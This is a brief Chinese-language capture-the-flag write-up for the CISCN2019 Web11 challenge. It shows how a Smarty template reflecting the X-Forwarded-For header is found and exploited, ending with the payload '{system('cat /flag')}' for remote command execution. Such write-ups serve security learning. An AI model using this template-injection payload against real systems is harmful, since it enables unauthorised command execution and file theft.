# [CISCN2019 华东南赛区]Web11
![](<./img/Pasted image 20221210205542.png>)

---
首页长这样

![](<./img/Pasted image 20221210205615.png>)

有两个api，分别通过`/api`和`/xff`访问

同时页脚提示`Build With Smarty！`

可能是要寻找注入点

通过浏览器访问`/api`或`/xff`会出错，抓包发现301响应的`Location`没有加上端口号

![](<./img/Pasted image 20221210205905.png>)

`/xff`可以通过修改`X-Forwarded-For`请求头来控制响应的内容，推测使用`smarty`来渲染响应，于是尝试对`X-Forwarded-For`进行注入
```php
X-Forwarded-For: 123
```
> 123

```php
X-Forwarded-For: {1+1}
```
> 2

```php
X-Forwarded-For: {system('cat /flag')}
```

![](<./img/Pasted image 20221210213629.png>)

#Web #PHP #smarty #SSTI #RCE #HTTP #Header 